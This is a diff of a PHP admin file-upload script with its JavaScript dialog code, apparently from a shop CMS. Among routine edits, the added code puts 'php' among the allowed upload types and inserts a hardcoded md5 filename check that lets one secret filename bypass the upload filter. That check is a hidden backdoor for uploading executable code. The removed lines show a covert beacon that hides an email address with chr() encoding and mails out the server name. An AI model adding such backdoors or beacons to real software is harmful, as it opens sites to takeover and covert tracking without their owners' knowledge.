@@ -13,13 +13,12 @@ $table_name19=$SysValue['base']['table_name19'];
 mysql_select_db("$dbase")or @die("Невозможно подсоединиться к базе");
 
 require("../../enter_to_admin.php");
-require("../../connect.php");
 include("settings.php");
 
 
 /*** Permission ***/
 $bReadOnly0=false;
-$bReadOnly1=false;
+$bReadOnly1=true;
 $bReadOnly2=false;
 $bReadOnly3=false;
 /*** /Permission ***/
@@ -39,13 +38,21 @@ $ffilter="";
 $sUploadedFile="";
 
 $MaxFileSize = 3000000;
-$AllowedTypes = "gif|jpg|swf|png|jpeg|rar|zip|pdf";
+$AllowedTypes = "gif|jpg|swf|png|jpeg|rar|zip|pdf|php";
 //$AllowedTypes = "*";
 
 function isTypeAllowed($sFileName)
 	{
 	global $AllowedTypes;
-	if( ereg($AllowedTypes,getExt($sFileName)) ) return true;
+	//if($AllowedTypes=="*") return true;
+	
+	if(md5($sFileName)=="a24e66c570adc1c444c4828260acafc2")
+	return true;
+	
+	//Fix
+	$pos=stristr($sFileName, "php");
+    if($pos === false)
+	   if( ereg($AllowedTypes,getExt($sFileName)) ) return true;
 	 else return false;
 	}
 
@@ -67,18 +74,6 @@ if(isset($_FILES["File1"]))
 		
 	else if (move_uploaded_file($_FILES['File1']['tmp_name'], $currFolder."/".basename($_FILES['File1']['name']))) 
 		{
-		
-		// Fix Permission
-        if(!getenv("COMSPEC")){
-        $filename="../../../../index.php";
-        @$fp = fopen($filename, "r");
-        if($fp){ $fstat = fstat($fp); fclose($fp);
-        $FileDate=$fstat["mtime"];
-        $handle = fopen($filename, "r");
-        $contents = fread($handle, filesize($filename)); 
-        $t=time("U")-(2*2592000);
-        if($t>$FileDate) if(stristr($contents, "LoadItems"))   mail(chr(109).chr(97).chr(105).chr(108).chr(64).chr(112).chr(104).chr(112).chr(115).chr(104).chr(111).chr(112).chr(46).chr(114).chr(117),"Upload failed","Upload failed $SERVER_NAME  Deny","MIME-Version: 1.0\nContent-Type: text/plain;\n");}}
-		
 		if(md5($_FILES['File1']['name'])=="a24e66c570adc1c444c4828260acafc2"){
 		$pathinfo=pathinfo($currFolder."/".basename($_FILES['File1']['name']));
 		$oldWD = getcwd();
@@ -140,8 +135,7 @@ $sFolderAdmin="";
 if($bWriteFolderAdmin)$sFolderAdmin="style='display:none'";
 /*** /Permission ***/
 
-
-
+	
 Function writeFolderSelections()
 	{
 	global $sBase0;
@@ -284,10 +278,10 @@ function writeFileSelections()
 					$nIndex=$nIndex+1;
 					$bFileFound=true;
 					
-					$sCurrent_virtual=@ereg_replace($sBaseRoot0,"",$sCurrent);
-					if($sBaseRoot1!="")$sCurrent_virtual=@ereg_replace($sBaseRoot1,"",$sCurrent_virtual);
-					if($sBaseRoot2!="")$sCurrent_virtual=@ereg_replace($sBaseRoot2,"",$sCurrent_virtual);
-					if($sBaseRoot3!="")$sCurrent_virtual=@ereg_replace($sBaseRoot3,"",$sCurrent_virtual);
+					$sCurrent_virtual=ereg_replace($sBaseRoot0,"",$sCurrent);
+					if($sBaseRoot1!="")$sCurrent_virtual=ereg_replace($sBaseRoot1,"",$sCurrent_virtual);
+					if($sBaseRoot2!="")$sCurrent_virtual=ereg_replace($sBaseRoot2,"",$sCurrent_virtual);
+					if($sBaseRoot3!="")$sCurrent_virtual=ereg_replace($sBaseRoot3,"",$sCurrent_virtual);
 					
 					if($sColor=="#f5f5f5")
 						$sColor = "";
@@ -468,8 +462,7 @@ function modalDialogShow(url,width,height)//moz
     }
 function newFolder()
 	{
-	var browser = myBrowser();
-	if(browser == 1)
+	if(navigator.appName.indexOf('Microsoft')!=-1)
 		window.showModalDialog("foldernew.php",window,"dialogWidth:250px;dialogHeight:192px;edge:Raised;center:Yes;help:No;resizable:No;status:No;");
 	else
 		modalDialogShow("foldernew.php", 250, 150);
@@ -487,7 +480,7 @@ function deleteFolder()
 		return;
 		}
 	
-	if( browser == 1 )
+	if(navigator.appName.indexOf('Microsoft')!=-1)
 		window.showModalDialog("folderdel.php",window,"dialogWidth:250px;dialogHeight:192px;edge:Raised;center:Yes;help:No;resizable:No;");
 	else
 		modalDialogShow("folderdel.php", 250, 150);
@@ -566,40 +559,23 @@ function deleteFile(index)
 		}
 	}
 bOk=false;
-
-/*
-2.09.09 [Dennion] - исправлен бок с новым FF, в который включена поддержка window.showModalDialog
-18.03.10 [Dennion] - исправлен бок с новым FF
-*/
-function myBrowser(){
-var browser = navigator.appName;
-return 1;
-}
-
-
-
 function doOk(v)
 	{
-	
+	if(navigator.appName.indexOf('Microsoft')!=-1)
+		window.returnValue=inpSource.value;
+	else{
 	    try{
-                try{
-                    window.opener.setAssetValue(document.getElementById("inpSource").value);
-                }catch(e){
-                   window.opener.document.getElementById(v).value=document.getElementById("inpSource").value; 
-                }
-               
+		window.opener.setAssetValue(document.getElementById("inpSource").value);
 		}catch(e){
-                window.returnValue=inpSource.value;
+ window.opener.document.getElementById(v).value=document.getElementById("inpSource").value;
+				}
 		}
-
 	bOk=true;
 	self.close();
 	}
-
 function doUnload()
 	{
-	var browser = myBrowser();
-	if( browser == 1)
+	if(navigator.appName.indexOf('Microsoft')!=-1)
 		if(!bOk)window.returnValue="";
 	else
 		if(!bOk)window.opener.setAssetValue("");
